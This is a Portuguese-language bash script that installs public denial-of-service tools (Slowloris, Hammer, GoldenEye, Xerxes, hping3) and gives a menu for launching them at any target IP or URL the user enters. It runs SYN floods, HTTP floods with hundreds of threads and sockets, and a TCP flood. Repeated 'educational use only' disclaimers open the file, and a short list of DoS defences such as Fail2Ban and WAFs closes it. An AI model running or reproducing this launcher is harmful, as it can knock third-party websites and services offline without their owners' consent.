#!/bin/bash

#############################################################################################
### Autor: Thalles Canela
# 📦 Instalador de todas as ferramentas via menu
# 🛠️ Correção automática dos submódulos do Xerxes
# 📁 Clone de repositórios diretamente para /opt
# 🔐 Requisições com permissões elevadas onde necessário
#
### Salve esse script como ataques.sh, torne-o executável:
# chmod +x ataque.sh
# sudo ./ataque.sh
#
# 🛠️ Características Avançadas
#  - Slowloris: Ataca por sockets semi-abertos mantendo conexões pendentes.
#  - hping3: Envia pacotes SYN rapidamente com flood (modo --flood).
#  - Hammer: Ataque HTTP massivo com múltiplas threads (configurado com -t 135).
#  - GoldenEye (ataque HTTP multithread via Python)
#  - Xerxes (ataque TCP agressivo via sockets personalizados)
#  - HOIC (roda via Wine, e sua interação é gráfica – portanto será apenas invocado)
#############################################################################################

#########################################################################################################
# 🛡️ ATENÇÃO: Este script é destinado apenas para fins educacionais e de teste em ambientes controlados.#
#########################################################################################################
# ⚠️ Não utilize em sistemas sem autorização explícita. ⚠️
# ⚠️ O uso indevido pode resultar em consequências legais. ⚠️
# ⚠️ Sempre obtenha permissão antes de realizar testes de segurança. ⚠️
# ⚠️ O autor não se responsabiliza por qualquer dano causado. ⚠️
# ⚠️ Use com responsabilidade e ética. ⚠️
# ⚠️ Este script é uma ferramenta de aprendizado e não deve ser usado para atividades ilegais. ⚠️
# ⚠️ O uso indevido pode resultar em consequências legais. ⚠️
# ⚠️ Sempre obtenha permissão antes de realizar testes de segurança. ⚠️
# ⚠️ O autor não se responsabiliza por qualquer dano causado. ⚠️
# ⚠️ Use com responsabilidade e ética. ⚠️
# ⚠️ Este script é destinado apenas para fins educacionais e de teste em ambientes controlados. ⚠️
# ⚠️ Não utilize em sistemas sem autorização explícita. ⚠️
# ⚠️ O uso indevido pode resultar em consequências legais. ⚠️
#########################################################################################################
# 🛡️ ATENÇÃO: Este script é destinado apenas para fins educacionais e de teste em ambientes controlados.#
#########################################################################################################

# Caminho para as ferramentas
BASE_DIR="/opt"
SLOWLORIS_DIR="$BASE_DIR/slowloris"
HAMMER_DIR="$BASE_DIR/hammer"
GOLDENEYE_DIR="$BASE_DIR/GoldenEye"
XERXES_DIR="$BASE_DIR/Xerxes"

function banner() {
    echo "========================================"
    echo "         FERRAMENTAS DE ATAQUE"
    echo "       (Somente para testes legais)"
    echo "========================================"
}

function instalar_dependencias_gerais() {
    echo "[+] Instalando dependências básicas..."
    sudo apt update
    sudo apt install -y git python3 python3-pip build-essential cmake hping3 wine
}

function instalar_slowloris() {
    echo "[+] Clonando Slowloris..."
    sudo git clone https://github.com/gkbrk/slowloris.git "$SLOWLORIS_DIR"
}

function instalar_hammer() {
    echo "[+] Clonando Hammer..."
    sudo git clone https://github.com/cyweb/hammer.git "$HAMMER_DIR"
}

function instalar_goldeneye() {
    echo "[+] Clonando GoldenEye..."
    sudo git clone https://github.com/jseidl/GoldenEye.git "$GOLDENEYE_DIR"
}

function instalar_xerxes() {
    echo "[+] Clonando e compilando Xerxes..."
    sudo git clone --recurse-submodules https://github.com/sepehrdaddev/Xerxes.git "$XERXES_DIR"
    cd "$XERXES_DIR"
    sudo git submodule update --init --recursive
    mkdir -p build && cd build
    cmake ..
    make
}

function menu_instalacao() {
    while true; do
        clear
        banner
        echo "MENU DE INSTALAÇÃO"
        echo "1. Instalar dependências gerais"
        echo "2. Instalar Slowloris"
        echo "3. Instalar Hammer"
        echo "4. Instalar GoldenEye"
        echo "5. Instalar Xerxes (com correção de submódulos)"
        echo "6. Voltar ao menu principal"
        read -p "Escolha uma opção: " OPCAO

        case $OPCAO in
            1) instalar_dependencias_gerais ;;
            2) instalar_slowloris ;;
            3) instalar_hammer ;;
            4) instalar_goldeneye ;;
            5) instalar_xerxes ;;
            6) break ;;
            *) echo "Opção inválida!" ;;
        esac
        read -p "Pressione Enter para continuar..."
    done
}

function banner() {
    echo "=============================="
    echo "    MENU - ATAQUES DE DOS"
    echo "=============================="
}

function slowloris_attack() {
    read -p "Digite o IP ou domínio do alvo: " TARGET
    read -p "Digite a porta (padrão 80): " PORT
    [ -z "$PORT" ] && PORT=80
    echo "Iniciando ataque Slowloris em $TARGET:$PORT"
    python3 "$SLOWLORIS_DIR/slowloris.py" $TARGET -p $PORT
}

function hping3_synflood() {
    read -p "Digite o IP do alvo: " TARGET
    read -p "Digite a porta (padrão 80): " PORT
    [ -z "$PORT" ] && PORT=80
    echo "Iniciando ataque SYN Flood com hping3 em $TARGET:$PORT"
    sudo hping3 -c 100000 --flood -S -p $PORT $TARGET
}

function hammer_attack() {
    read -p "Digite a URL do alvo (ex: http://alvo.com): " FULL_URL
    # Remove http:// ou https://
    TARGET=$(echo $FULL_URL | sed -E 's~https?://~~' | cut -d/ -f1)
    echo "Iniciando ataque HTTP flood com Hammer em $TARGET"
    cd "$HAMMER_DIR"
    python3 hammer.py -s $TARGET -t 135
    cd -
}

function goldeneye_attack() {
    read -p "Digite a URL (ex: http://alvo.com): " TARGET
    read -p "Threads (recom.: 200): " THREADS
    read -p "Sockets por worker (recom.: 500): " SOCKETS
    [ -z "$THREADS" ] && THREADS=200
    [ -z "$SOCKETS" ] && SOCKETS=500
    echo "Iniciando GoldenEye com $THREADS threads e $SOCKETS sockets em $TARGET"
    python3 "$GOLDENEYE_DIR/goldeneye.py" $TARGET -w $THREADS -s $SOCKETS -n
}

function xerxes_attack() {
    read -p "Digite o IP do alvo: " TARGET
    read -p "Digite a porta (padrão 80): " PORT
    [ -z "$PORT" ] && PORT=80
    echo "Iniciando ataque Xerxes em $TARGET:$PORT"
    "$XERXES_DIR/xerxes" $TARGET $PORT
}

function menu_principal() {
    while true; do
        banner
        echo "1. Slowloris (HTTP Socket Attack)"
        echo "2. hping3 (SYN Flood)"
        echo "3. Hammer (HTTP Flood via Threads)"
        echo "4. GoldenEye (HTTP Flood via Threads)"
        echo "5. Xerxes (TCP Custom Attack)"
        echo "6. Instalar Ferramentas"
        echo "7. Sair"
        read -p "Escolha uma opção: " OPTION

        case $OPTION in
            1) slowloris_attack ;;
            2) hping3_synflood ;;
            3) hammer_attack ;;
            4) goldeneye_attack ;;
            5) xerxes_attack ;;
            6) menu_instalacao ;;
            7) echo "Saindo..."; exit 0 ;;
            *) echo "Opção inválida!" ;;
        esac
        echo ""
        read -p "Pressione Enter para continuar..."
        clear
    done
}

menu_principal

# 🔧 Ferramentas de Teste de Negação de Serviço no Linux
# 1. LOIC (Low Orbit Ion Cannon)
# - GUI para testes de DoS simples.
# - Famosa por ser usada por grupos de ativismo digital.
# - Permite ataque via TCP, UDP e HTTP.
# - Uso recomendado apenas em ambientes isolados.

# 2. HOIC (High Orbit Ion Cannon)
# - Versão mais potente do LOIC.
# - Suporte a múltiplos threads.
# - Utiliza "boosters" para variar payloads.

# 3. Hping3
# - Ferramenta de linha de comando poderosa para gerar pacotes TCP/IP.
# - Pode ser usada para simular ataques SYN flood.

# 4. Slowloris
# - Ataque em nível de aplicação (HTTP).
# - Mantém conexões abertas de forma parcial para esgotar recursos do servidor.
# - Eficaz contra servidores web mal configurados.

# 5. Xerxes
# - Ferramenta de DoS usada pelo Anonymous.
# - Requer compilação manual em muitos casos.
# - Atua em camadas mais baixas da pilha de rede.

# 6. Metasploit Framework
# - Contém módulos para simulação de ataques DoS.
# - Pode ser integrado em testes automatizados com permissões.

# 7. GoldenEye
# - Script Python para ataque DoS via HTTP.
# - Simula múltiplos agentes de usuário.

# 🔒 Ferramentas de Defesa contra DoS/DDoS
# - Caso seu interesse seja na defesa, veja ferramentas como:
# - Fail2Ban
# - iptables / nftables (com limites de conexões)
# - mod_evasive / mod_security (para Apache)
# - HAProxy com regras anti-flood
# - Traefik com middleware de rate limit
# - Cloudflare / WAFs